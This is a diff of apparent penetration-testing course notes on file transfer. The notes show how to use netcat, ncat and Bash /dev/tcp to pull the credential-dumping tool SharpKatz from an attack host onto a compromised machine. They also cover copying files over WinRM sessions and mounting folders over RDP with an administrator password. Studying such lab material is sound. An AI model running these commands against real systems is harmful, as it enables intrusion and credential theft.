@@ -28,8 +28,7 @@ We'll first start Netcat (`nc`) on the compromised machine, listening with optio
 
 #### NetCat - Compromised Machine - Listening on Port 8000
 
-```
-        shellsession
+```shellsession
 victim@target:~$ # Example using Original Netcat
 victim@target:~$ nc -l -p 8000 > SharpKatz.exe
 ```
@@ -38,8 +37,7 @@ If the compromised machine is using Ncat, we'll need to specify `--recv-only` to
 
 #### Ncat - Compromised Machine - Listening on Port 8000
 
-```
-        shellsession
+```shellsession
 victim@target:~$ # Example using Ncat
 victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
 ```
@@ -48,8 +46,7 @@ From our attack host, we'll connect to the compromised machine on port 8000 usin
 
 #### Netcat - Attack Host - Sending File to Compromised machine
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
 hiimeins@htb[/htb]$ # Example using Original Netcat
 hiimeins@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
@@ -59,8 +56,7 @@ By utilizing Ncat on our attacking host, we can opt for `--send-only` rather tha
 
 #### Ncat - Attack Host - Sending File to Compromised machine
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
 hiimeins@htb[/htb]$ # Example using Ncat
 hiimeins@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
@@ -70,16 +66,14 @@ Instead of listening on our compromised machine, we can connect to a port on our
 
 #### Attack Host - Sending File as Input to Netcat
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ # Example using Original Netcat
 hiimeins@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
 ```
 
 #### Compromised Machine Connect to Netcat to Receive the File
 
-```
-        shellsession
+```shellsession
 victim@target:~$ # Example using Original Netcat
 victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
 ```
@@ -88,16 +82,14 @@ Let's do the same with Ncat:
 
 #### Attack Host - Sending File as Input to Ncat
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ # Example using Ncat
 hiimeins@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
 ```
 
 #### Compromised Machine Connect to Ncat to Receive the File
 
-```
-        shellsession
+```shellsession
 victim@target:~$ # Example using Ncat
 victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
 ```
@@ -108,24 +100,21 @@ Writing to this particular file makes Bash open a TCP connection to `host:port`,
 
 #### NetCat - Sending File as Input to Netcat
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ # Example using Original Netcat
 hiimeins@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
 ```
 
 #### Ncat - Sending File as Input to Ncat
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ # Example using Ncat
 hiimeins@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
 ```
 
 #### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
 
-```
-        shellsession
+```shellsession
 victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
 ```
 
@@ -145,8 +134,7 @@ We have a session as `Administrator` in `DC01`, the user has administrative righ
 
 #### From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.
 
-```
-        powershell
+```powershell
 PS C:\htb> whoami
 
 htb\administrator
@@ -156,8 +144,7 @@ PS C:\htb> hostname
 DC01
 ```
 
-```
-        powershell
+```powershell
 PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
 
 ComputerName     : DATABASE01
@@ -172,8 +159,7 @@ Because this session already has privileges over `DATABASE01`, we don't need to 
 
 #### Create a PowerShell Remoting Session to DATABASE01
 
-```
-        powershell
+```powershell
 PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
 ```
 
@@ -181,15 +167,13 @@ We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` t
 
 #### Copy samplefile.txt from our Localhost to the DATABASE01 Session
 
-```
-        powershell
+```powershell
 PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
 ```
 
 #### Copy DATABASE.txt from DATABASE01 Session to our Localhost
 
-```
-        powershell
+```powershell
 PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
 ```
 
@@ -207,15 +191,13 @@ This section's virtual machine has Windows Defender enabled. Sharing directories
 
 #### Mounting a Linux Folder Using rdesktop
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
 ```
 
 #### Mounting a Linux Folder Using xfreerdp
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
 ```
 
